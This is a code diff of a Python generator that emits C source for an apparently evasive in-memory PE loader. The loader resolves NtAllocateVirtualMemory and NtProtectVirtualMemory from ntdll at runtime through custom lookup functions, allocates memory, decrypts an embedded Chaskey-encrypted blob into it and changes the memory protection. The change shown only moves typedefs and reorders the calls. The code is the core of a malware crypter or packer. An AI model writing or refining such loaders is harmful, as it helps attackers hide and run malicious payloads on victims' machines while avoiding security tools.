@@ -77,6 +77,24 @@ if use_encrypt:
     nonce_literal = ", ".join(f"0x{b:02x}" for b in chaskey_nonce)
     c_source = textwrap.dedent(f"""
     #include "pe_loader.h"
+    
+    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
+        HANDLE ProcessHandle,
+        PVOID *BaseAddress,
+        ULONG_PTR ZeroBits,
+        PSIZE_T RegionSize,
+        ULONG AllocationType,
+        ULONG Protect
+    );
+
+    typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
+        HANDLE ProcessHandle,
+        PVOID *BaseAddress,
+        PSIZE_T RegionSize,
+        ULONG NewProtect,
+        PULONG OldProtect
+    );
+    
     typedef unsigned long long u64;
     typedef unsigned long u32;
 
@@ -134,31 +152,11 @@ if use_encrypt:
     void _start(void) {{
         HMODULE hNtdll = myLoadLibraryA(ntdll_dll);
 
-        typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
-            HANDLE ProcessHandle,
-            PVOID *BaseAddress,
-            ULONG_PTR ZeroBits,
-            PSIZE_T RegionSize,
-            ULONG AllocationType,
-            ULONG Protect
-        );
-
-        typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
-            HANDLE ProcessHandle,
-            PVOID *BaseAddress,
-            PSIZE_T RegionSize,
-            ULONG NewProtect,
-            PULONG OldProtect
-        );
+        SIZE_T size = sizeof(enc_blob);
+        PVOID pe = NULL;
 
         NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
             (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);
-
-        NtProtectVirtualMemory_t NtProtectVirtualMemory =
-            (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
-
-        SIZE_T size = sizeof(enc_blob);
-        PVOID pe = NULL;
 
         NtAllocateVirtualMemory(
             (HANDLE)-1,
@@ -172,6 +170,10 @@ if use_encrypt:
         decrypt_blob((unsigned char*)pe);
 
         ULONG oldProt;
+        
+        NtProtectVirtualMemory_t NtProtectVirtualMemory =
+            (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
+        
         NtProtectVirtualMemory(
             (HANDLE)-1,
             &pe,
